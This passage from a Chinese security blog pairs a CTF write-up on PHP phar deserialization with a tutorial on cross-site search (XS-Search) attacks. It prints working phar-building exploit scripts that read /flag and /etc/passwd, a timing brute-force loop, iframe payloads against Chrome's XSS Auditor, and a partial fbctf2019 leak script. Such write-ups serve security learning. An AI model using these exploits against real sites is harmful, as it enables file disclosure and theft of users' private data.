<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    .......</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="寻找存在-close-函数的类"><a href="#寻找存在-close-函数的类" class="headerlink" title="寻找存在 close() 函数的类"></a>寻找存在 <code>close()</code> 函数的类</h3><p>发现 <code>File</code> 类中存在  <code>close()</code> 函数。可上传文件，通过 <code>file_get_contents($this-&gt;filename)</code> 函数读取文件，所以可以明确是涉及 <code>phar://</code> 协议反序列化。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，基本的反序列化利用链已经出现了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>But，无法回显被读取文件的内容。 </p>
<h3 id="利用-FileList-类"><a href="#利用-FileList-类" class="headerlink" title="利用 FileList 类"></a>利用 FileList 类</h3><p><code>FileList</code> 类没有 <code>close()</code> 函数, But 有 <code>__call()</code>。假如将 <code>$this-&gt;db</code> 设置为 <code>FileList</code> 类，则 <code>$this-&gt;db-&gt;close() = FileList-&gt;close()</code>，将触发 <code>__call</code> ，代码如下所示。其中 <code>$file-&gt;$func()</code> 中的 <code>$file</code> 来源于 <code>$this-&gt;files</code> ，可令 <code>$this-&gt;files = array(new File())</code>，则  <code>$file-&gt;$func()</code> 将执行 <code>File-&gt;close()</code>。同时将执行结果赋值到 <code>results</code> 数组。而 <code>results</code> 数组将会通过 <code>FileList-&gt;__destruct()</code> 展示在返回给访客的页面中，即可以返回指定文件的读取结果给攻击者。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取文件EXP"><a href="#读取文件EXP" class="headerlink" title="读取文件EXP"></a>读取文件EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/04/%E8%B7%A8%E7%AB%99%E6%90%9C%E7%B4%A2%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/04/%E8%B7%A8%E7%AB%99%E6%90%9C%E7%B4%A2%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">跨站搜索攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-04 11:23:28 / Modified: 11:25:10" itemprop="dateCreated datePublished" datetime="2022-05-04T11:23:28+08:00">2022-05-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/xs-search/" itemprop="url" rel="index"><span itemprop="name">xs-search</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="跨站搜索攻击"><a href="#跨站搜索攻击" class="headerlink" title="跨站搜索攻击"></a>跨站搜索攻击</h1><p>跨站搜索攻击。基于目标站点 <strong>“根据内容搜索文件”</strong> 功能存在 CSRF 的前提下，攻击者在自己控制服务器上部署的 web 页面并设置搜索指定文件的 JavaScript 代码 ，诱导受害者访问该 web 页面。受害者访问后，通过一些技术，攻击者可得知受害者的文件库中是否存在指定文件，或猜测指定内容。</p>
<h2 id="基于时间的跨站搜索攻击"><a href="#基于时间的跨站搜索攻击" class="headerlink" title="基于时间的跨站搜索攻击"></a>基于时间的跨站搜索攻击</h2><p>基于时间的跨站搜索攻击。攻击者利用 <strong>CSRF 漏洞</strong> 强制受害者访问一些资源，这些资源只能是该受害者可以访问。然后，通过分析响应请求所需的时间，判断内容是否被正确访问。</p>
<p>攻击场景：某个 web 页面，各用户在该网页中只能访问属于自己的文件，admin 用户能访问所有文件。如果想知道以 <em><strong>flag</strong></em> 开头的文件，该如何做？</p>
<p>基于目标站点 <strong>“根据内容搜索文件”</strong> 功能存在 <strong>CSRF</strong> 漏洞，诱导 <strong>admin</strong> 访问由攻击者控制的 Web 页面，利用 CSRF 强制受害者循环执行搜索请求，以强制搜索所有以 “_<em>flag开头的文件</em><em>”可能性。然后，如果某个搜索请求比其他搜索请求的响应时间更久，你可以<strong>假设</strong>当前搜索请求获得了<strong>正确</strong>的响应（即服务器返回了 “</em><em>flag开头的文件</em>_” 内容），你可以用 “_flag{X_” 开始一个<strong>新循环</strong>直到拿到flag为止。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 代码展示上述过程</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;abcdefghijklmn....&quot;</span> </span><br><span class="line"><span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> strings:</span><br><span class="line">    url = <span class="string">&quot;http://target.com/search.php?filename=flag&#123;X&quot;</span>+ <span class="built_in">str</span></span><br><span class="line">    response = request.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.elapsed.total_seconds() &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(o゜▽゜)o☆[BINGO!]&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>有关更多信息，您可以阅读：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549">https:&#x2F;&#x2F;medium.com&#x2F;@luanherrera&#x2F;xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549</a></li>
<li><a target="_blank" rel="noopener" href="https://www.researchgate.net/publication/280738245_Cross-Site_Search_Attacks">https://www.researchgate.net/publication/280738245_Cross-Site_Search_Attacks</a></li>
</ul>
<h2 id="基于-Iframe-的跨站搜索攻击"><a href="#基于-Iframe-的跨站搜索攻击" class="headerlink" title="基于 Iframe 的跨站搜索攻击"></a>基于 Iframe 的跨站搜索攻击</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>在 Iframe 中，存在onload事件的情况下，onload 事件<strong>至少执行一次</strong>。如果一个 url 第一次能被正常加载，更改 window.hash 内容后，onload 事件将不会再次触发。如果 url 加载时出现某种错误（包括但不限于以下事件：请求超时、 域名不存在、 被 chrome XSS 过滤器的 block 模式屏蔽），那么更改 window.hash 内容后， <strong>onload</strong> 事件将被再次触发。</p>
<p>例如:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 Chrome Console 进行测试</span></span><br><span class="line"><span class="title class_">Console</span></span><br><span class="line">&gt; iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>); <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">&gt; iframe.<span class="property">onload</span>=<span class="function">()=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onload 事件已触发&quot;</span>);&#125;</span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://www.baidu.com/#try1&quot;</span>  <span class="comment">// window.hash： try1，目标站点存在 X-Frame-Options ，加载被 block。报错信息如下：</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">2 [Report Only] Refused to frame &#x27;https://www.baidu.com/&#x27; because it violates the following Content Security Policy directive: &quot;frame-src &#x27;self&#x27; https://g.alicdn.com&quot;.</span></span><br><span class="line"><span class="comment">Refused to display &#x27;https://www.baidu.com/#try1&#x27; in a frame because it set &#x27;X-Frame-Options&#x27; to &#x27;sameorigin&#x27;. 6698:1 </span></span><br><span class="line"><span class="comment">onload 事件已触发 VM5536:1 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://www.baidu.com/#try2&quot;</span> <span class="comment">//window.hash： try1 -》 try2，再次触发onload事件</span></span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://sing3r.top/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/#try1&quot;</span> <span class="comment">// window.hash： try1，正常加载，触发 onload 事件</span></span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://sing3r.top/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/#try2&quot;</span> <span class="comment">// window.hash： try1 -》 try2，正常加载，不触发 onload 事件</span></span><br></pre></td></tr></table></figure>

<p>根据上述知识，我们可以轻松区分一个页面是否加载正常。<br>同时也可以在访问正确的内容时，强制页面出现加载错误（如欺骗 Chrome XSS auditor，详见下面），并在访问非正确内容时使其正常加载，那么就可以创建循环请求，提取所有信息而无需通过分析响应时间。</p>
<h3 id="基于-Iframe-的跨站搜索攻击之-Chrome-XSS-Auditor-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效"><a href="#基于-Iframe-的跨站搜索攻击之-Chrome-XSS-Auditor-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效" class="headerlink" title="基于 Iframe 的跨站搜索攻击之 Chrome XSS Auditor (PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效)"></a>基于 Iframe 的跨站搜索攻击之 Chrome XSS Auditor (<em><strong>PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效</strong></em>)</h3><h4 id="Chrome-XSS-auditor-判断逻辑"><a href="#Chrome-XSS-auditor-判断逻辑" class="headerlink" title="Chrome XSS auditor 判断逻辑"></a>Chrome XSS auditor 判断逻辑</h4><p>chrome 的 XSS auditor 逻辑比较简单, 判断有没有输入敏感payload, 判断页面中有没有和自己长的一样的, 如果有敏感的payload, 同时页面中也有和自己长得一样的内容就会屏蔽。</p>
<h4 id="欺骗-Chrome-XSS-Auditor-进行-xs-seacrh"><a href="#欺骗-Chrome-XSS-Auditor-进行-xs-seacrh" class="headerlink" title="欺骗 Chrome XSS Auditor 进行 xs-seacrh"></a>欺骗 Chrome XSS Auditor 进行 xs-seacrh</h4><p>假如受害者使用 Chrome 浏览器，同时目标站点搜索功能在检索到有效内容时，response 中会包含特定的 JavaScript 代码，如：<code>&lt;script&gt;console.log(&#39;you found someting&#39;);&lt;/script&gt;</code>。检索不到有效内容时则不返回这个JavaScript代码。</p>
<p>基于上述场景，我们可使用 Iframe 让受害者循环搜索包含 <em><strong>flagX</strong></em> 的文件，同时在搜索请求的 url 中添加一个 fake 参数，参数值为 <code>&lt;script&gt;console.log(&#39;you found someting&#39;);&lt;/script&gt;</code>。这样就可以欺骗 Chrome XSS auditor，触发浏览器 XXS 拦截功能，从而导致加载失败。通过判断 Iframe 加载 url 是否失败，判断 flagX 中的 X 值是否正确。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 初始循环</span><br><span class="line">1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flagA&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flagB&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">N. ..........</span><br><span class="line">N+1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 有检索结果，response中包含 “&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;/script&gt;” ，触发 Chrome XSS auditor，Iframe 加载失败，内容 &quot;flag&#123;&quot; 正确--&gt;</span></span><br><span class="line"></span><br><span class="line"># 再次循环</span><br><span class="line">1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;A&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;B&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">N. ..........</span><br><span class="line">N+1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;f&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 有检索结果，response 存在“&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;/script&gt;” ，触发 Chrome XSS auditor内容，&quot;flag&#123;f&quot; 正确 --&gt;</span></span><br><span class="line"></span><br><span class="line"># 继续循环</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>For more information: <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HcrQy0C-hEA">https://www.youtube.com/watch?v=HcrQy0C-hEA</a></p>
<h3 id="欺骗-Chrome-XSS-Auditor-进行窃取令牌-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效"><a href="#欺骗-Chrome-XSS-Auditor-进行窃取令牌-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效" class="headerlink" title="欺骗 Chrome XSS Auditor 进行窃取令牌(PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效)"></a>欺骗 Chrome XSS Auditor 进行窃取令牌(<em><strong>PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效</strong></em>)</h3><p>使用上述提及技巧， 欺骗 Chrome XSS Auditor，您可以<strong>窃取返回给用户的代码块</strong>（例如token）。更多信息：<a target="_blank" rel="noopener" href="https://portswigger.net/blog/abusing-chromes-xss-auditor-to-steal-tokens">https://portswigger.net/blog/abusing-chromes-xss-auditor-to-steal-tokens</a></p>
<p>请注意，您将窃取返回给用户的信息，而不是来自网络服务器的任何代码。</p>
<h3 id="基于-Iframe-的跨站搜索攻击之-iframe-contentWindow"><a href="#基于-Iframe-的跨站搜索攻击之-iframe-contentWindow" class="headerlink" title="基于 Iframe 的跨站搜索攻击之 iframe.contentWindow"></a>基于 Iframe 的跨站搜索攻击之 iframe.contentWindow</h3><p>这个的背景是一道CTF题目(fbctf2019), 在搜索笔记时, 所有被搜索到的笔记都会单独作为一个iframe列出, 而管理员拥有的一个私有的笔记, 这个笔记的内容中放置了flag, 题目没有限制外域打开(即没有设置 <code>X-Frame-Options</code> ), 可以通过 <code>Window.frames</code> 接口通过 <code>frames.length</code> 判断搜索的结果个数从而盲注得到flag。<br>具体来讲就是:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123; =&gt; frames.length = 1</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;a =&gt; frames.length = 0</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;b =&gt; frames.length = 0</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;c =&gt; frames.length =1</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;ca =&gt; frames.length = 0</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
<p>直到发现 <code>&#125;</code> 为止。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>fbctf secret note keeper<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~ &#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> charLen = chars.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> <span class="variable constant_">ENDPOINT</span> = <span class="string">&quot;http://challenges.fbctf.com:8082/search?query=&quot;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">leak, charCounter</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> curChar = chars[charCounter];</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&#x27;http://challenges.fbctf.com:8082/search?query=&#x27;</span> + leak + curChar);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable 